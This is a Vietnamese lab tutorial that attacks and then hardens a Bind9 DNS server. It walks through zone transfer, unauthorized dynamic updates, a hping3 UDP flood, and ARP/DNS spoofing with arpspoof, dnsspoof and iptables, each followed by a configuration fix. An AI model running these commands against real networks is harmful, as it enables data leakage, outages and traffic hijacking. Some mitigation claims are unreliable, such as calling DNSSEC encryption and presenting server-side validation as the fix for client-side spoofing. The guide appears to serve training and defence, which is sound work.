# 🌐 Lab: Khai thác và Phòng thủ Dịch vụ DNS (Bind9)

## 🎯 Mục tiêu bài Lab
Bài lab này hướng dẫn các kỹ thuật tấn công phổ biến nhắm vào dịch vụ phân giải tên miền (DNS) chạy trên nền tảng Bind9 (Ubuntu Server). Qua đó, cấu hình tinh chỉnh bảo mật cho máy chủ DNS để chống lại các lỗ hổng như rò rỉ bản ghi (Zone Transfer), cập nhật trái phép (Dynamic Update), từ chối dịch vụ (DoS) và giả mạo DNS (DNS Cache Poisoning).

## ⚙️ Môi trường & Công cụ
* **Máy chủ DNS (Target):** Ubuntu Server (Bind9) - IP: `192.168.1.20`
* **Máy trạm (Victim):** VPC Client - IP: `192.168.1.30`
* **Máy tấn công:** Kali Linux - IP: `192.168.1.10`
* **Công cụ:** `dig`, `nsupdate`, `hping3`, `arpspoof`, `dnsspoof`

> **📌 Lưu ý quan trọng về AppArmor trên Ubuntu:**
> Hệ điều hành Ubuntu sử dụng cơ chế bảo mật AppArmor quy định thư mục `/etc/bind/` chỉ có quyền **đọc** (read-only) đối với dịch vụ Bind9. Do đó, các hành động cập nhật động (dynamic update) tạo file mới sẽ bị từ chối. 
> Để thực hành các bài lab liên quan đến ghi file cấu hình zone, bạn cần chuyển vị trí lưu trữ file cấu hình zone sang `/var/lib/bind/` (Ví dụ: `sudo nano /var/lib/bind/db.lab.local`).

---

## 🚀 Kịch bản tấn công & Phòng thủ

### 1. Tấn công Zone Transfer (Rò rỉ toàn bộ bản ghi)
Lợi dụng việc máy chủ DNS không giới hạn quyền truy vấn AXFR, kẻ tấn công có thể tải về toàn bộ cơ sở dữ liệu tên miền (Zone file) của hệ thống.

**Thực thi tấn công:**
Từ máy Kali Linux, chạy các lệnh sau để truy vấn DNS server mục tiêu:
```bash
# Kiểm tra Name Server của domain lab.local
dig NS lab.local @192.168.1.20

# Yêu cầu chuyển giao toàn bộ Zone (AXFR)
dig axfr lab.local @192.168.1.20
```

**🛡️ Cách khắc phục:**
Mở file cấu hình zone `/etc/bind/named.conf.local` (hoặc `/var/lib/bind/named.conf.local`) trên máy chủ DNS, thiết lập chỉ thị không cho phép transfer hoặc chỉ cho phép các IP tin cậy:
```bash
zone "lab.local" {
    ...
    allow-transfer { none; }; 
};
```
*Sau khi khởi động lại Bind9, máy Kali dùng lệnh `dig axfr` sẽ nhận được thông báo Transfer failed.*

---

### 2. Tấn công Dynamic Update (Cập nhật tên miền trái phép)
Nếu máy chủ DNS được cấu hình lỏng lẻo (`allow-update { any; }`), kẻ tấn công có thể chèn các bản ghi DNS độc hại trỏ về IP của mình.

**Thực thi tấn công:**
Từ máy Kali, sử dụng công cụ `nsupdate`:
```bash
nsupdate
> server 192.168.1.20
> update add hacker.lab.local 86400 A 192.168.1.10
> send
> quit

# Kiểm tra lại xem bản ghi đã được cập nhật thành công chưa
dig hacker.lab.local @192.168.1.20
```

**🛡️ Cách khắc phục:**
Trong file cấu hình zone, thiết lập lại chỉ thị cập nhật:
```bash
zone "lab.local" {
    ...
    allow-update { none; }; 
};
```

---

### 3. Tấn công DoS (Denial of Service) DNS
Kẻ tấn công sử dụng công cụ tạo gói tin để spam một lượng lớn UDP traffic vào port 53, làm cạn kiệt tài nguyên xử lý của máy chủ DNS.

**Thực thi tấn công:**
* Chuẩn bị lệnh kiểm tra truy vấn DNS (Terminal 1) nhưng chưa ấn Enter: `dig bank.lab.local @192.168.1.20`
* Mở Terminal 2 và kích hoạt tấn công DoS bằng hping3 (Flood port 53 UDP):
```bash
sudo hping3 --udp -p 53 --flood 192.168.1.20
```
*Quay lại Terminal 1 ấn Enter, lúc này máy chủ DNS đã quá tải và không thể trả lời truy vấn.*

**🛡️ Cách khắc phục:**
Mở file `/etc/bind/named.conf.options` và thêm khối `rate-limit` vào bên trong phần `options { ... };`:
```bash
options {
    ...
    rate-limit {
        responses-per-second 10;  // Chỉ trả lời tối đa 10 lần/giây cho cùng 1 IP
        window 5;                 // Theo dõi hành vi trong cửa sổ 5 giây
    };
};
```

---

### 4. Tấn công DNS Cache Poisoning (MITM + DNS Spoofing)
Kẻ tấn công thực hiện ARP Spoofing để đứng giữa kết nối của máy trạm và máy chủ DNS, sau đó giả mạo gói tin trả lời DNS để ép máy trạm truy cập vào trang web giả mạo.

**Cấu hình máy trạm (VPC Client):**
```bash
ip 192.168.1.30/24 192.168.1.1
ip dns 192.168.1.20
```

**Thực thi tấn công (Từ máy Kali):**
```bash
# Bật tính năng IP Forwarding để không làm mất hoàn toàn kết nối mạng của Victim
sudo sysctl -w net.ipv4.ip_forward=1

# Chặn các gói tin DNS thật trả về bằng iptables
sudo iptables -I FORWARD -p udp --dport 53 -j DROP

# Tạo file mồi nhử chứa bản ghi DNS giả mạo
echo "192.168.1.10 www.lab.local" > fake_dns.txt

# Mở Terminal 1: Thực hiện ARP Spoofing để đánh lừa máy Victim
sudo arpspoof -i eth0 -t 192.168.1.30 192.168.1.20

# Mở Terminal 2: Thực hiện DNS Spoofing, trả lời truy vấn bằng thông tin từ file mồi nhử
sudo dnsspoof -i eth0 -f fake_dns.txt
```

**🛡️ Cách khắc phục:**
Trên máy chủ DNS, vào file `/etc/bind/named.conf.options` và bật tính năng xác thực DNSSEC (Domain Name System Security Extensions) để mã hóa và xác thực tính toàn vẹn của gói tin DNS trả về:
```bash
options {
    ...
    dnssec-validation auto;
};
```

---
*Project by Nguyen Gia Bao (Hoa Bảo Lục) - 2026*